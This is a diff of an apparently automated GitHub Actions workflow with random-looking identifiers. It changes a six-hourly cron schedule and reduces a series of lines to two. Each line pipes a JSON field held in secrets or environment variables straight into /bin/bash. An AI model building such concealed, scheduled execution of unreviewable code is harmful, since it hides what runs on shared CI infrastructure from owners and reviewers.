@@ -3,27 +3,18 @@ name: budajian3691
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
+    - cron: '10 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: budajian3691
         env:
-          yvk0131: ${{ secrets.yvk0131 }}
+          js65733: ${{ secrets.js65733 }}
         run: |
-          echo $yvk0131 | jq -r .ihxc02 | /bin/bash
-          echo $dgp83620 | jq -r .gz1 | /bin/bash
-          echo $ld1 | jq -r .dayo551 | /bin/bash
-          echo $wxn62556 | jq -r .avz366 | /bin/bash
-          echo $pekpt143 | jq -r .oj8926 | /bin/bash
-          echo $rqyj69 | jq -r .cmm275 | /bin/bash
-          echo $gwa0 | jq -r .t28 | /bin/bash
-          echo $s58 | jq -r .ceoxu253 | /bin/bash
-          echo $lyyu567 | jq -r .xvwjg17 | /bin/bash
-          echo $ckp067 | jq -r .pwfzd202 | /bin/bash
-          echo $a63147 | jq -r .sfejz38183 | /bin/bash
-          echo $vajp0085 | jq -r .npaxf014 | /bin/bash
-          echo $jjqn776 | jq -r .vgrr7602 | /bin/bash
+          echo $js65733 | jq -r .ghrj2 | /bin/bash
+          echo $zisrc3 | jq -r .nrrc6292 | /bin/bash
 
